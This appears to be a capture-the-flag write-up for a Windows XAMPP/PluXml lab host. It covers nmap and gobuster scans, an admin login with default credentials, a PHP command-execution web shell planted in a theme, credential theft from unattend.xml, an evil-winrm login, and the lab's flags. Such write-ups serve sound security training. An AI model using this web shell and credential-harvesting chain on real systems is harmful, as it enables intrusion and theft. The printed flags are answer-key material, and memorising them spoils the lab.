## .151

Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-03 13:43 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.200.150.151
Host is up (0.022s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp  open  microsoft-ds?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3306/tcp open  mysql?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   NULL: 
|_    Host 'ip-10-250-1-6.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
5000/tcp open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.2)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /core/: Potentially interesting folder
|   /data/: Potentially interesting folder
|   /icons/: Potentially interesting folder w/ directory listing
|_  /themes/: Potentially interesting folder
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apache:http_server:2.4.52: 
|     	PACKETSTORM:176334	9.8	https://vulners.com/packetstorm/PACKETSTORM:176334	*EXPLOIT*
|     	HTTPD:C072933AA965A86DA3E2C9172FFC1569	9.8	https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
|     	HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D	9.8	https://vulners.com/httpd/HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D
|     	HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E	9.8	https://vulners.com/httpd/HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E
|     	D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52	9.8	https://vulners.com/githubexploit/D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52	*EXPLOIT*
|     	CVE-2024-38476	9.8	https://vulners.com/cve/CVE-2024-38476
|     	CVE-2024-38474	9.8	https://vulners.com/cve/CVE-2024-38474
|     	CVE-2023-25690	9.8	https://vulners.com/cve/CVE-2023-25690
|     	CVE-2022-31813	9.8	https://vulners.com/cve/CVE-2022-31813
|     	CVE-2022-23943	9.8	https://vulners.com/cve/CVE-2022-23943
|     	CVE-2022-22720	9.8	https://vulners.com/cve/CVE-2022-22720
|     	CNVD-2024-36391	9.8	https://vulners.com/cnvd/CNVD-2024-36391
|     	CNVD-2024-36388	9.8	https://vulners.com/cnvd/CNVD-2024-36388
|     	CNVD-2022-51061	9.8	https://vulners.com/cnvd/CNVD-2022-51061
|     	CNVD-2022-41640	9.8	https://vulners.com/cnvd/CNVD-2022-41640
|     	64A540A8-D918-5BEA-8F60-987F97B27A0C	9.8	https://vulners.com/githubexploit/64A540A8-D918-5BEA-8F60-987F97B27A0C	*EXPLOIT*
|     	5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9	9.8	https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9	*EXPLOIT*
|     	3F17CA20-788F-5C45-88B3-E12DB2979B7B	9.8	https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B	*EXPLOIT*
|     	1337DAY-ID-39214	9.8	https://vulners.com/zdt/1337DAY-ID-39214*EXPLOIT*
|     	PACKETSTORM:213257	9.1	https://vulners.com/packetstorm/PACKETSTORM:213257	*EXPLOIT*
|     	HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6	9.1	https://vulners.com/httpd/HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6
|     	HTTPD:2C227652EE0B3B961706AAFCACA3D1E1	9.1	https://vulners.com/httpd/HTTPD:2C227652EE0B3B961706AAFCACA3D1E1
|     	FD2EE3A5-BAEA-5845-BA35-E6889992214F	9.1	https://vulners.com/githubexploit/FD2EE3A5-BAEA-5845-BA35-E6889992214F	*EXPLOIT*
|     	FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7	9.1	https://vulners.com/githubexploit/FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7	*EXPLOIT*
|     	E606D7F4-5FA2-5907-B30E-367D6FFECD89	9.1	https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89	*EXPLOIT*
|     	D8A19443-2A37-5592-8955-F614504AAF45	9.1	https://vulners.com/githubexploit/D8A19443-2A37-5592-8955-F614504AAF45	*EXPLOIT*
|     	CVE-2025-23048	9.1	https://vulners.com/cve/CVE-2025-23048
|     	CVE-2024-40898	9.1	https://vulners.com/cve/CVE-2024-40898
|     	CVE-2024-38475	9.1	https://vulners.com/cve/CVE-2024-38475
|     	CVE-2022-28615	9.1	https://vulners.com/cve/CVE-2022-28615
|     	CVE-2022-22721	9.1	https://vulners.com/cve/CVE-2022-22721
|     	CNVD-2025-16610	9.1	https://vulners.com/cnvd/CNVD-2025-16610
|     	CNVD-2024-36387	9.1	https://vulners.com/cnvd/CNVD-2024-36387
|     	CNVD-2024-33814	9.1	https://vulners.com/cnvd/CNVD-2024-33814
|     	CNVD-2022-51060	9.1	https://vulners.com/cnvd/CNVD-2022-51060
|     	CNVD-2022-41638	9.1	https://vulners.com/cnvd/CNVD-2022-41638
|     	B5E74010-A082-5ECE-AB37-623A5B33FE7D	9.1	https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D	*EXPLOIT*
|     	5418A85B-F4B7-5BBD-B106-0800AC961C7A	9.1	https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A	*EXPLOIT*
|     	CVE-2022-36760	9.0	https://vulners.com/cve/CVE-2022-36760
|     	CNVD-2023-30860	9.0	https://vulners.com/cnvd/CNVD-2023-30860
|     	3F71F065-66D4-541F-A813-9F1A2F2B1D91	8.8	https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91	*EXPLOIT*
|     	CVE-2025-58098	8.3	https://vulners.com/cve/CVE-2025-58098
|     	B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	8.2	https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	*EXPLOIT*
|     	CVE-2024-38473	8.1	https://vulners.com/cve/CVE-2024-38473
|     	249A954E-0189-5182-AE95-31C866A057E1	8.1	https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1	*EXPLOIT*
|     	23079A70-8B37-56D2-9D37-F638EBF7F8B5	8.1	https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5	*EXPLOIT*
|     	DF041B2B-2DA7-5262-AABE-9EBD2D535041	7.8	https://vulners.com/githubexploit/DF041B2B-2DA7-5262-AABE-9EBD2D535041	*EXPLOIT*
|     	PACKETSTORM:212872	7.5	https://vulners.com/packetstorm/PACKETSTORM:212872	*EXPLOIT*
|     	PACKETSTORM:211124	7.5	https://vulners.com/packetstorm/PACKETSTORM:211124	*EXPLOIT*
|     	HTTPD:C317C7138B4A8BBD54A901D6DDDCB837	7.5	https://vulners.com/httpd/HTTPD:C317C7138B4A8BBD54A901D6DDDCB837
|     	HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F	7.5	https://vulners.com/httpd/HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F
|     	HTTPD:B1B0A31C4AD388CC6C575931414173E2	7.5	https://vulners.com/httpd/HTTPD:B1B0A31C4AD388CC6C575931414173E2
|     	HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5	7.5	https://vulners.com/httpd/HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5
|     	EDB-ID:52426	7.5	https://vulners.com/exploitdb/EDB-ID:52426	*EXPLOIT*
|     	E5C174E5-D6E8-56E0-8403-D287DE52EB3F	7.5	https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F	*EXPLOIT*
|     	DB6E1BBD-08B1-574D-A351-7D6BB9898A4A	7.5	https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A	*EXPLOIT*
|     	D228B59B-465A-509D-A681-012DB9348698	7.5	https://vulners.com/githubexploit/D228B59B-465A-509D-A681-012DB9348698	*EXPLOIT*
|     	CVE-2025-59775	7.5	https://vulners.com/cve/CVE-2025-59775
|     	CVE-2025-55753	7.5	https://vulners.com/cve/CVE-2025-55753
|     	CVE-2025-53020	7.5	https://vulners.com/cve/CVE-2025-53020
|     	CVE-2025-49630	7.5	https://vulners.com/cve/CVE-2025-49630
|     	CVE-2024-47252	7.5	https://vulners.com/cve/CVE-2024-47252
|     	CVE-2024-43394	7.5	https://vulners.com/cve/CVE-2024-43394
|     	CVE-2024-43204	7.5	https://vulners.com/cve/CVE-2024-43204
|     	CVE-2024-42516	7.5	https://vulners.com/cve/CVE-2024-42516
|     	CVE-2024-39573	7.5	https://vulners.com/cve/CVE-2024-39573
|     	CVE-2024-38477	7.5	https://vulners.com/cve/CVE-2024-38477
|     	CVE-2024-38472	7.5	https://vulners.com/cve/CVE-2024-38472
|     	CVE-2024-27316	7.5	https://vulners.com/cve/CVE-2024-27316
|     	CVE-2023-31122	7.5	https://vulners.com/cve/CVE-2023-31122
|     	CVE-2023-27522	7.5	https://vulners.com/cve/CVE-2023-27522
|     	CVE-2022-30556	7.5	https://vulners.com/cve/CVE-2022-30556
|     	CVE-2022-29404	7.5	https://vulners.com/cve/CVE-2022-29404
|     	CVE-2022-26377	7.5	https://vulners.com/cve/CVE-2022-26377
|     	CVE-2022-22719	7.5	https://vulners.com/cve/CVE-2022-22719
|     	CVE-2006-20001	7.5	https://vulners.com/cve/CVE-2006-20001
|     	CNVD-2025-30837	7.5	https://vulners.com/cnvd/CNVD-2025-30837
|     	CNVD-2025-30836	7.5	https://vulners.com/cnvd/CNVD-2025-30836
|     	CNVD-2025-16614	7.5	https://vulners.com/cnvd/CNVD-2025-16614
|     	CNVD-2025-16613	7.5	https://vulners.com/cnvd/CNVD-2025-16613
|     	CNVD-2025-16612	7.5	https://vulners.com/cnvd/CNVD-2025-16612
|     	CNVD-2025-16609	7.5	https://vulners.com/cnvd/CNVD-2025-16609
|     	CNVD-2025-16608	7.5	https://vulners.com/cnvd/CNVD-2025-16608
|     	CNVD-2025-16603	7.5	https://vulners.com/cnvd/CNVD-2025-16603
|     	CNVD-2024-36393	7.5	https://vulners.com/cnvd/CNVD-2024-36393
|     	CNVD-2024-36390	7.5	https://vulners.com/cnvd/CNVD-2024-36390
|     	CNVD-2024-36389	7.5	https://vulners.com/cnvd/CNVD-2024-36389
|     	CNVD-2024-20839	7.5	https://vulners.com/cnvd/CNVD-2024-20839
|     	CNVD-2023-93320	7.5	https://vulners.com/cnvd/CNVD-2023-93320
|     	CNVD-2023-80558	7.5	https://vulners.com/cnvd/CNVD-2023-80558
|     	CNVD-2022-53584	7.5	https://vulners.com/cnvd/CNVD-2022-53584
|     	CNVD-2022-51058	7.5	https://vulners.com/cnvd/CNVD-2022-51058
|     	CNVD-2022-41639	7.5	https://vulners.com/cnvd/CNVD-2022-41639
|     	CDC791CD-A414-5ABE-A897-7CFA3C2D3D29	7.5	https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29	*EXPLOIT*
|     	BD3652A9-D066-57BA-9943-4E34970463B9	7.5	https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9	*EXPLOIT*
|     	B0208442-6E17-5772-B12D-B5BE30FA5540	7.5	https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540	*EXPLOIT*
|     	A6687F08-B033-5AE7-84F5-DE799491DA2F	7.5	https://vulners.com/githubexploit/A6687F08-B033-5AE7-84F5-DE799491DA2F	*EXPLOIT*
|     	A66531EB-3C47-5C56-B8A6-E04B54E9D656	7.5	https://vulners.com/githubexploit/A66531EB-3C47-5C56-B8A6-E04B54E9D656	*EXPLOIT*
|     	A0F268C8-7319-5637-82F7-8DAF72D14629	7.5	https://vulners.com/githubexploit/A0F268C8-7319-5637-82F7-8DAF72D14629	*EXPLOIT*
|     	9814661A-35A4-5DB7-BB25-A1040F365C81	7.5	https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81	*EXPLOIT*
|     	8132DEBA-6222-5A32-84DE-B97EF48D0F99	7.5	https://vulners.com/githubexploit/8132DEBA-6222-5A32-84DE-B97EF48D0F99	*EXPLOIT*
|     	7C6FD510-4E4C-564E-ADDC-8BC362BE504C	7.5	https://vulners.com/githubexploit/7C6FD510-4E4C-564E-ADDC-8BC362BE504C	*EXPLOIT*
|     	45D138AD-BEC6-552A-91EA-8816914CA7F4	7.5	https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4	*EXPLOIT*
|     	40879618-C556-547C-8769-9E63E83D0B55	7.5	https://vulners.com/githubexploit/40879618-C556-547C-8769-9E63E83D0B55	*EXPLOIT*
|     	1F6E0709-DA03-564E-925F-3177657C053E	7.5	https://vulners.com/githubexploit/1F6E0709-DA03-564E-925F-3177657C053E	*EXPLOIT*
|     	135C45BD-4652-5EEE-8890-2D3C62709016	7.5	https://vulners.com/githubexploit/135C45BD-4652-5EEE-8890-2D3C62709016	*EXPLOIT*
|     	0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8	7.5	https://vulners.com/githubexploit/0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8	*EXPLOIT*
|     	CVE-2025-49812	7.4	https://vulners.com/cve/CVE-2025-49812
|     	CVE-2023-38709	7.3	https://vulners.com/cve/CVE-2023-38709
|     	CNVD-2024-36395	7.3	https://vulners.com/cnvd/CNVD-2024-36395
|     	CVE-2025-65082	6.5	https://vulners.com/cve/CVE-2025-65082
|     	CNVD-2025-30833	6.5	https://vulners.com/cnvd/CNVD-2025-30833
|     	CVE-2024-24795	6.3	https://vulners.com/cve/CVE-2024-24795
|     	CNVD-2024-36394	6.3	https://vulners.com/cnvd/CNVD-2024-36394
|     	CVE-2023-45802	5.9	https://vulners.com/cve/CVE-2023-45802
|     	CVE-2025-66200	5.4	https://vulners.com/cve/CVE-2025-66200
|     	CNVD-2025-30835	5.4	https://vulners.com/cnvd/CNVD-2025-30835
|     	HTTPD:BAAB4065D254D64A717E8A5C847C7BCA	5.3	https://vulners.com/httpd/HTTPD:BAAB4065D254D64A717E8A5C847C7BCA
|     	HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F	5.3	https://vulners.com/httpd/HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F
|     	CVE-2022-37436	5.3	https://vulners.com/cve/CVE-2022-37436
|     	CVE-2022-28614	5.3	https://vulners.com/cve/CVE-2022-28614
|     	CVE-2022-28330	5.3	https://vulners.com/cve/CVE-2022-28330
|     	CNVD-2023-30859	5.3	https://vulners.com/cnvd/CNVD-2023-30859
|     	CNVD-2022-53582	5.3	https://vulners.com/cnvd/CNVD-2022-53582
|_    	CNVD-2022-51059	5.3	https://vulners.com/cnvd/CNVD-2022-51059
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=3/3%Time=69A6E596%P=x86_64-pc-linux-gnu%r(NUL
SF:L,67,"c\0\0\x01\xffj\x04Host\x20'ip-10-250-1-6\.eu-west-1\.compute\.int
SF:ernal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaD
SF:B\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 335.66 seconds





gobuster dir -u http://10.200.150.151:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,conf,bak,env

/index.php            (Status: 200) [Size: 6609]
/sitemap.php          (Status: 200) [Size: 737]
/feed.php             (Status: 200) [Size: 3962]
/themes               (Status: 301) [Size: 348] [--> http://10.200.150.151:5000/themes/]
/data                 (Status: 301) [Size: 346] [--> http://10.200.150.151:5000/data/]
/plugins              (Status: 301) [Size: 349] [--> http://10.200.150.151:5000/plugins/]
/Index.php            (Status: 200) [Size: 6611]
/core                 (Status: 301) [Size: 346] [--> http://10.200.150.151:5000/core/]
/update               (Status: 301) [Size: 348] [--> http://10.200.150.151:5000/update/]
/README               (Status: 403) [Size: 305]
/examples             (Status: 503) [Size: 405]
/SiteMap.php          (Status: 200) [Size: 737]
/Themes               (Status: 301) [Size: 348] [--> http://10.200.150.151:5000/Themes/]
/config.php           (Status: 200) [Size: 0]
/readme               (Status: 403) [Size: 305]
/licenses             (Status: 403) [Size: 424]
/siteMap.php          (Status: 200) [Size: 737]
/Sitemap.php          (Status: 200) [Size: 737]
/%20                  (Status: 403) [Size: 305]
/Data                 (Status: 301) [Size: 346] [--> http://10.200.150.151:5000/Data/]




in /feed.php i get that user: admin

http://10.200.150.151:5000/update/

i have downgraded the system but i got error (php got in error): 
Fatal error :
type : 2
message : Undefined array key "passwords"
file : C:\xampp\htdocs\update\update_5.0.php
line : 107

See https://www.php.net/manual/en/errorfunc.constants.php about type of error


http://10.200.150.151:5000/core/admin/auth.php
i used user: admin (learn before), password: admin (just to try)
got in => prabably becouse the software actualization reset to default settings
PluXml is XML-based

into theme i have inserted reverse shell
<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); echo "fdsafdasf"; } ?>

Command executed: whoami

Discovery: We found we were the user win\banner.

http://10.200.150.151:5000/index.php?cmd=dir%20/a%20C:\
i see user.txt

http://10.200.150.151:5000/index.php?cmd=type%20C:\user.txt
THM{58b61aa6-3d63-4ad0-ae91-9acc2493b39c}  


http://10.200.150.151:5000/index.php?cmd=type%20C:\xampp\passwords.txt
mysql: user: root, password:  (null)
mercury: User: newuser Password: wampp 


Privilege Escalation Hunting (Finding the Weakness)

    Command executed: reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

    Discovery: This was the turning point. We saw AutoAdminLogon = 1 and DefaultUserName = banner. This told us the system was configured to log in automatically, which meant a password must be stored somewhere on the disk in a configuration file.

     The "Unattend" Search

    Command executed: dir /s /b C:\unattend.xml

    The Logic: On Windows systems (especially those deployed in cloud environments like AWS or via Sysprep), the Unattend.xml file is used to automate the setup process. It often contains the credentials for the local administrator or the default user.

    Discovery: The search returned several paths, including:

        C:\Windows\Panther\Unattend\unattend.xml

        C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml

 The Final Extraction (Your Last Command)

    Command executed: type C:\Windows\Panther\Unattend\unattend.xml (URL encoded).

    The Result: This revealed the XML structure containing:

        Username: banner

        Password: U3Ryb25nQXZlbmdlciE= (Base64 for StrongAvenger!)

  cd .


  http://10.200.150.151:5000/index.php?cmd=netstat%20-an%20%7C%20findstr%20LISTENING
  evil-winrm -i 10.200.150.151 -u banner -p 'StrongAvenger!'


                                 

shutdown /r /f /t 0

C:\Windows\system32>type C:\Users\Administrator\root.txt
type C:\Users\Administrator\root.txt
THM{b77e1720-7241-482b-a4c2-56305532bf65}  